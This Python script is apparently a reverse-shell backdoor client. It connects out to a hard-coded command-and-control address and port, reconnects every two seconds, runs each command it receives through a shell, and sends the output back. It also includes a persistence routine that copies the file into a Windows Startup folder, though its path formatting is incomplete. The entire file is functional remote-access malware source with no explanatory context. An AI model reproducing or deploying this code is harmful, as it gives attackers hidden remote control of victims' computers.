import socket
import subprocess
import threading
import time
import os

CCIP="192.168.43.64"
CCPORT=444##

def auto_run():
    auto_file=os.path.basename(__file__)
    os.system("copy {} \"C:\\Users\\Yassine\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"")
    
def connect(CCIP,CCPORT):
    try:
        client =socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        client.connect((CCIP,CCPORT))
        return client
    except Exception as err:
        print(err)
def my_cmd(client,data):
    try:
        process=subprocess.Popen(data,shell=True,stdin=subprocess.PIPE,stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        output=process.stdout.read()+process.stderr.read()
        print(output+ b"\n")
        client.send(output+ b"\n")
    except Exception as err:
        print(err)
    
def target(client):
    try:
        while True:
            data=client.recv(1024).decode().strip()##1024 =1 bit
            if data =="/:kill" :
                return
            else:
                threading.Thread(target=my_cmd,args=(client,data)).start()
    except Exception as err:
        client.close()


##my_cmd(0,"dir") to test
if __name__=="__main__":
    while True:
        client=connect(CCIP,CCPORT)
        if client:
            target(client)
        else:
            time.sleep(2)
            
            
print("OK")
